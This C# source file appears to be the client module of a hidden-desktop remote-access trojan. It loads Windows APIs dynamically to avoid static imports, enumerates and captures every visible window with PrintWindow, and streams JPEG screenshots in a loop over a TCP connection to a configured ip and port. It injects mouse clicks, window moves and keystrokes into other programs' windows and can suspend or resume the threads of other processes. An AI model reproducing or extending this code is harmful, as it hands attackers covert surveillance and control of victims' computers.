using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;

namespace DLL.Functions
{
   public static class Outils
	{

		public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

		public struct RECT
		{
			public int Left;

			public int Top;

			public int Right;

			public int Bottom;
		}

		public enum CWPFlags
		{
			CWP_ALL
		}

		[Flags]
		public enum RedrawWindowFlags : uint
		{
			Invalidate = 0x1u,
			InternalPaint = 0x2u,
			Erase = 0x4u,
			Validate = 0x8u,
			NoInternalPaint = 0x10u,
			NoErase = 0x20u,
			NoChildren = 0x40u,
			AllChildren = 0x80u,
			UpdateNow = 0x100u,
			EraseNow = 0x200u,
			Frame = 0x400u,
			NoFrame = 0x800u
		}

		[Flags]
		public enum ThreadAccess
		{
			TERMINATE = 0x1,
			SUSPEND_RESUME = 0x2,
			GET_CONTEXT = 0x8,
			SET_CONTEXT = 0x10,
			SET_INFORMATION = 0x20,
			QUERY_INFORMATION = 0x40,
			SET_THREAD_TOKEN = 0x80,
			IMPERSONATE = 0x100,
			DIRECT_IMPERSONATION = 0x200
		}

		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool DelegateIsWindowVisible(IntPtr hWnd);

		public delegate bool DelegateEnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

		public delegate bool DelegatePrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

		public delegate bool DelegateGetWindowRect(IntPtr hWnd, ref RECT lpRect);

		public delegate IntPtr DelegateWindowFromPoint(Point p);

		public delegate IntPtr DelegateGetWindow(IntPtr hWnd, uint uCmd);

		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool DelegateIsZoomed(IntPtr hwnd);

		public delegate IntPtr DelegateGetParent(IntPtr hwnd);

		public delegate int DelegateGetSystemMetrics(int nIndex);



		[DllImport("kernel32", SetLastError = true)]
		public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

		public static CreateApi LoadApi<CreateApi>(string name, string method)
		{
			return Conversions.ToGenericParameter<CreateApi>(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi)));
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		[DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
		public static extern IntPtr FindWindowEx2(IntPtr hWnd1, IntPtr hWnd2, IntPtr lpsz1, string lpsz2);



		public static TcpClient Client = new TcpClient();

		public static NetworkStream nstream;

		public static string ip;

		public static int port;

		public static string Identifier;

		public static string Mutex;

		public static string username;

		public static int screenx = 1028;

		public static int screeny = 1028;

		public static IntPtr lastactive;

		public static IntPtr lastactivebar;

		public static int interval = 500;

		public static int quality = 50;

		public static double resize = 0.5;

		public static int TitleBarHeight;

		public static bool HigherThan81 = false;

		public static readonly DelegateIsWindowVisible IsWindowVisible = LoadApi<DelegateIsWindowVisible>("user32", "IsWindowVisible");

		public static readonly DelegateEnumDesktopWindows EnumDesktopWindows = LoadApi<DelegateEnumDesktopWindows>("user32", "EnumDesktopWindows");

		public static readonly DelegatePrintWindow PrintWindow = LoadApi<DelegatePrintWindow>("user32", "PrintWindow");

		public static readonly DelegateGetWindowRect GetWindowRect = LoadApi<DelegateGetWindowRect>("user32", "GetWindowRect");

		public static readonly DelegateWindowFromPoint WindowFromPoint = LoadApi<DelegateWindowFromPoint>("user32", "WindowFromPoint");

		public static readonly DelegateGetWindow GetWindow = LoadApi<DelegateGetWindow>("user32", "GetWindow");

		public static readonly DelegateIsZoomed IsZoomed = LoadApi<DelegateIsZoomed>("user32", "IsZoomed");

		public static readonly DelegateGetParent GetParent = LoadApi<DelegateGetParent>("user32", "GetParent");

		public static readonly DelegateGetSystemMetrics GetSystemMetrics = LoadApi<DelegateGetSystemMetrics>("user32", "GetSystemMetrics");

		public static int startxpos;

		public static int startypos = 0;

		public static int startwidth;

		public static int startheight = 0;

		public static IntPtr handletomove;

		public static IntPtr handletoresize;

		public static IntPtr contextmenu;

		public static bool rightclicked = false;

		public static ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

		public static string MPath;
		//private static string MPath = Path.GetTempPath();

		public static string MFile;

		public static Process procM = new Process();

		public static string tempFile;






		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);


		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint SuspendThread(IntPtr hThread);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hHandle);

		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint ResumeThread(IntPtr hThread);

		public static Computer a = new Computer();

		public static List<string> collection = new List<string>();

		public static object collection2 = new List<IntPtr>();

		public static Thread newt = new Thread(SCT);




		public static IntPtr FindHandle(string title)
		{
			collection = new List<string>();
			collection2 = new List<IntPtr>();
			checked
			{
				EnumDelegate lpEnumCallbackFunction = delegate (IntPtr hWnd, int lParam)
				{
					bool result2 = default(bool);
					try
					{
						StringBuilder stringBuilder = new StringBuilder(255);
						IntPtr hWnd2 = hWnd;
						int countOfChars = stringBuilder.Capacity + 1;
						IntPtr result = IntPtr.Zero;
						int num2 = (int)SendMessageTimeoutText(hWnd2, 13, countOfChars, stringBuilder, 2, 1000u, out result);
						string text = stringBuilder.ToString();
						if (IsWindowVisible(hWnd) && !string.IsNullOrEmpty(text))
						{
							object instance = collection2;
							object[] obj2 = new object[1] { hWnd };
							object[] array = obj2;
							bool[] obj3 = new bool[1] { true };
							bool[] array2 = obj3;
							NewLateBinding.LateCall(instance, null, "Add", obj2, null, null, obj3, IgnoreReturn: true);
							if (array2[0])
							{
								hWnd = (IntPtr)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(IntPtr));
							}
							collection.Add(text);
						}
						result2 = true;
						return result2;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						return result2;
					}
				};
				EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero);
				int num = collection.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					if (collection[i].ToLower().Contains(title.ToLower()))
					{
						object obj = NewLateBinding.LateIndexGet(collection2, new object[1] { i }, null);
						return (obj != null) ? ((IntPtr)obj) : default(IntPtr);
					}
				}
				return default(IntPtr);
			}
		}


		public static void SendInformation(Stream stream, object message)
		{
			if (message == null)
			{
				return;
			}
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
			binaryFormatter.FilterLevel = TypeFilterLevel.Full;
			checked
			{
				lock (Client)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(message);
					ulong num = 0uL;
					MemoryStream memoryStream = new MemoryStream();
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
					num = (ulong)memoryStream.Position;
					Client.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
					byte[] buffer = memoryStream.GetBuffer();
					Client.GetStream().Write(buffer, 0, (int)num);
					memoryStream.Close();
					memoryStream.Dispose();
				}
			}
		}


		public static object IsFileOpen(FileInfo file)
		{
			object result = default(object);
			if (file.Exists)
			{
				FileStream fileStream = null;
				try
				{
					fileStream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
					fileStream.Close();
					result = false;
					return result;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					if (ex2 is IOException)
					{
						result = true;
						ProjectData.ClearProjectError();
						return result;
					}
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return result;
		}


		public static void SuspendProcess(Process process)
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = process.Threads.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessThread processThread = (ProcessThread)enumerator.Current;
					IntPtr intPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						SuspendThread(intPtr);
						CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		public static void ResumeProcess(Process process)
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = process.Threads.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ProcessThread processThread = (ProcessThread)enumerator.Current;
					IntPtr intPtr = OpenThread(ThreadAccess.SUSPEND_RESUME, bInheritHandle: false, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						ResumeThread(intPtr);
						CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}


		public static void PostClickLD(int x, int y)
		{
			IntPtr intPtr = (lastactive = WindowFromPoint(new Point(x, y)));
			RECT lpRect = default(RECT);
			GetWindowRect(intPtr, ref lpRect);
			checked
			{
				Point point = new Point(x - lpRect.Left, y - lpRect.Top);
				string lpClassName = "#32768";
				IntPtr intPtr2 = FindWindow(lpClassName, null);
				if (intPtr2 != IntPtr.Zero)
				{
					contextmenu = intPtr2;
					IntPtr lParam = (IntPtr)MakeLParam(x, y);
					PostMessage(contextmenu, 513u, new IntPtr(1), lParam);
					rightclicked = true;
				}
				else if (GetParent(intPtr) == (IntPtr)0 && y - lpRect.Top < TitleBarHeight)
				{
					lastactivebar = intPtr;
					PostMessage(intPtr, 513u, (IntPtr)1, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
					startxpos = x;
					startypos = y;
					handletomove = intPtr;
					SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 3u);
					SetWindowPos(intPtr, new IntPtr(-1), 0, 0, 0, 0, 3u);
					SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 67u);
				}
				else if (GetParent(intPtr) == (IntPtr)0 && point.X > lpRect.Right - lpRect.Left - 10 && point.Y > lpRect.Bottom - lpRect.Top - 10)
				{
					startwidth = x;
					startheight = y;
					handletoresize = intPtr;
				}
				else
				{
					PostMessage(intPtr, 513u, (IntPtr)1, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
				}
			}
		}

		public static void PostClickLU(int x, int y)
		{
			IntPtr hWnd = WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			GetWindowRect(hWnd, ref lpRect);
			checked
			{
				if (rightclicked)
				{
					PostMessage(contextmenu, 514u, new IntPtr(1), (IntPtr)MakeLParam(x, y));
					rightclicked = false;
					contextmenu = IntPtr.Zero;
				}
				else if ((startxpos > 0) | (startypos > 0))
				{
					PostMessage(handletomove, 514u, (IntPtr)0L, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
					RECT lpRect2 = default(RECT);
					GetWindowRect(handletomove, ref lpRect2);
					int num = x - startxpos;
					int num2 = y - startypos;
					int num3 = lpRect2.Left + num;
					int num4 = lpRect2.Top + num2;
					SetWindowPos(handletomove, new IntPtr(0), lpRect2.Left + num, lpRect2.Top + num2, lpRect2.Right - lpRect2.Left, lpRect2.Bottom - lpRect2.Top, 64u);
					startxpos = 0;
					startypos = 0;
					handletomove = IntPtr.Zero;
				}
				else if ((startwidth > 0) | (startheight > 0))
				{
					RECT lpRect3 = default(RECT);
					GetWindowRect(handletoresize, ref lpRect3);
					int num5 = x - startwidth;
					int num6 = y - startheight;
					int cx = lpRect3.Right - lpRect3.Left + num5;
					int cy = lpRect3.Bottom - lpRect3.Top + num6;
					SetWindowPos(handletoresize, new IntPtr(0), lpRect3.Left, lpRect3.Top, cx, cy, 64u);
					startwidth = 0;
					startheight = 0;
					handletoresize = IntPtr.Zero;
				}
				else
				{
					PostMessage(hWnd, 514u, (IntPtr)0L, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
				}
			}
		}

		public static void PostClickRD(int x, int y)
		{
			IntPtr hWnd = WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			GetWindowRect(hWnd, ref lpRect);
			checked
			{
				Point point = new Point(x - lpRect.Left, y - lpRect.Top);
				PostMessage(lastactive = WindowFromPoint(new Point(x, y)), 516u, (IntPtr)0L, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			}
		}

		public static void PostClickRU(int x, int y)
		{
			IntPtr hWnd = WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			GetWindowRect(hWnd, ref lpRect);
			checked
			{
				Point point = new Point(x - lpRect.Left, y - lpRect.Top);
				IntPtr hWnd2 = WindowFromPoint(new Point(x, y));
				PostMessage(hWnd2, 517u, (IntPtr)0L, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			}
		}

		public static void PostDblClk(int x, int y)
		{
			IntPtr hWnd = WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			GetWindowRect(hWnd, ref lpRect);
			checked
			{
				Point point = new Point(x - lpRect.Left, y - lpRect.Top);
				PostMessage(lastactive = WindowFromPoint(new Point(x, y)), 515u, (IntPtr)0L, (IntPtr)MakeLParam(x - lpRect.Left, y - lpRect.Top));
			}
		}

		public static void PostMove(int x, int y)
		{
			IntPtr hWnd = WindowFromPoint(new Point(x, y));
			RECT lpRect = default(RECT);
			GetWindowRect(hWnd, ref lpRect);
			PostMessage(hWnd, 512u, (IntPtr)0L, (IntPtr)checked(MakeLParam(x - lpRect.Left, y - lpRect.Top)));
		}

		public static void PostKeyDown(string k)
		{
			int num = Strings.AscW(k);
			if (num == 8 || num == 13)
			{
				PostMessage(lastactive, 256u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), CreateLParamFor_WM_KEYDOWN(1, 30, IsExtendedKey: false, DownBefore: false));
				PostMessage(lastactive, 257u, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), CreateLParamFor_WM_KEYUP(1, 30, IsExtendedKey: false));
			}
			else
			{
				PostMessage(lastactive, 258u, (IntPtr)Strings.AscW(k), (IntPtr)1);
			}
		}

		public static IntPtr KeysLParam(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
		{
			int num = RepeatCount | (ScanCode << 16);
			if (IsExtendedKey)
			{
				num |= 0x10000;
			}
			if (DownBefore)
			{
				num |= 0x40000000;
			}
			if (State)
			{
				num |= int.MinValue;
			}
			return new IntPtr(num);
		}

		public static IntPtr CreateLParamFor_WM_KEYDOWN(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
		{
			return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, State: false);
		}

		public static IntPtr CreateLParamFor_WM_KEYUP(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
		{
			return KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore: true, State: true);
		}

		public static int MakeLParam(int LoWord, int HiWord)
		{
			return (HiWord << 16) | (LoWord & 0xFFFF);
		}

		public static void SCT()
		{
			while (true)
			{
				try
				{
					Bitmap message = RenderScreenshot();
					Outils.SendInformation(nstream, message);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(interval);
			}
		}


		public static Bitmap RenderScreenshot()
		{
			checked
			{
				Bitmap result = default(Bitmap);
				try
				{
					var t = new List<IntPtr>();
					EnumDelegate lpEnumCallbackFunction = delegate (IntPtr hWnd, int lParam)
					{
						bool result2 = default(bool);
						try
						{
							if (IsWindowVisible(hWnd))
							{
								t.Add(hWnd);
							}
							result2 = true;
							return result2;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							return result2;
						}
					};
					if (EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero))
					{
						Bitmap bitmap = new Bitmap(screenx, screeny);
						int num = t.Count - 1;
						for (int i = num; i >= 0; i += -1)
						{
							try
							{
								RECT lpRect = default(RECT);
								GetWindowRect(t[i], ref lpRect);
								Bitmap image = new Bitmap(lpRect.Right - lpRect.Left + 1, lpRect.Bottom - lpRect.Top + 1);
								Graphics graphics = Graphics.FromImage(image);
								IntPtr hdc = graphics.GetHdc();
								try
								{
									if (HigherThan81)
									{
										PrintWindow(t[i], hdc, 2u);
									}
									else
									{
										PrintWindow(t[i], hdc, 0u);
									}
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
								}
								graphics.ReleaseHdc(hdc);
								graphics.FillRectangle(Brushes.Gray, lpRect.Right - lpRect.Left - 10, lpRect.Bottom - lpRect.Top - 10, 10, 10);
								Graphics graphics2 = Graphics.FromImage(bitmap);
								graphics2.DrawImage(image, lpRect.Left, lpRect.Top);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						Bitmap bitmap2 = new Bitmap(bitmap, (int)Math.Round((double)screenx * resize), (int)Math.Round((double)screeny * resize));
						ImageCodecInfo encoder = get_Codec("image/jpeg");
						EncoderParameters encoderParameters = new EncoderParameters(1);
						encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
						MemoryStream stream = new MemoryStream();
						bitmap2.Save(stream, encoder, encoderParameters);
						Bitmap bitmap3 = (Bitmap)Image.FromStream(stream);
						bitmap2.Dispose();
						GC.Collect();
						result = bitmap3;
						return result;
					}
					return result;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Outils.SendInformation(nstream, "60|" + ex2.ToString()); //
					try
					{
						result = ReturnBMP();
						ProjectData.ClearProjectError();
						return result;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}

		public static ImageCodecInfo get_Codec(string type)
		{
			if (type == null)
			{
				return null;
			}
			ImageCodecInfo[] array = codecs;
			foreach (ImageCodecInfo imageCodecInfo in array)
			{
				if (Operators.CompareString(imageCodecInfo.MimeType, type, TextCompare: false) == 0)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		public static Bitmap ReturnBMP()
		{
			Bitmap bitmap = new Bitmap(screenx, screeny);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				SolidBrush brush = (SolidBrush)Brushes.Red;
				graphics.FillRectangle(brush, 0, 0, screenx, screeny);
			}
			return bitmap;
		}


		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessageTimeout", SetLastError = true)]
		public static extern uint SendMessageTimeoutText(IntPtr hWnd, int Msg, int countOfChars, StringBuilder text, int flags, uint uTImeoutj, out IntPtr result);

		public static object Isgreaterorequalto81()
		{
			object result = default(object);
			try
			{
				OperatingSystem oSVersion = Environment.OSVersion;
				Version version = oSVersion.Version;
				if (oSVersion.Platform == PlatformID.Win32NT)
				{
					int major = version.Major;
					if (major == 6 && version.Minor != 0 && version.Minor != 1)
					{
						result = true;
						return result;
					}
				}
				result = false;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool ShowWindow(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] int nCmdShow);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);


	}
}
